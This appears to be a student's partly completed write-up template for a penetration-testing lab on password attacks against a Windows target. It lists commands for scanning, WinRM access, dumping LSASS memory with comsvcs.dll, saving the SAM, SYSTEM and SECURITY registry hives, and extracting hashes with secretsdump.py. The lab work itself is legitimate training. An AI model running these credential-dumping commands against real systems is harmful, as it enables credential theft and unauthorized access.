# Password Attacks — Skills Assessment

> **Target:** 10.129.234.116 | **OS:** Windows | **Difficulty:** Medium
> ⚠️ IP changes on restart — confirm current IP before starting.

---

## Assessment Checklist

- [ ] Foothold (initial access)
- [ ] Local enumeration
- [ ] Password attacks (local or remote)
- [ ] Privilege escalation
- [ ] Flag(s)

---

## 1. Recon

### Nmap Scan

```bash
nmap -sC -sV -Pn 10.129.234.116
```

---

## 2. Exploitation

### Initial Access

```bash
# Tool used:
netexec winrm <ip> -u user -p password
evil-winrm -i <ip> -u user -p password
```

---

## 3. Privilege Escalation

### Techniques

```bash
# LSASS dump
Get-Process lsass
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full

# SAM/SYSTEM dump
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save

# Crack with secretsdump.py
python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

---

## 4. Flags

| Flag | Location | Method |
|------|----------|--------|
| user.txt | | |
| root.txt | | |

---

## Lessons Learned

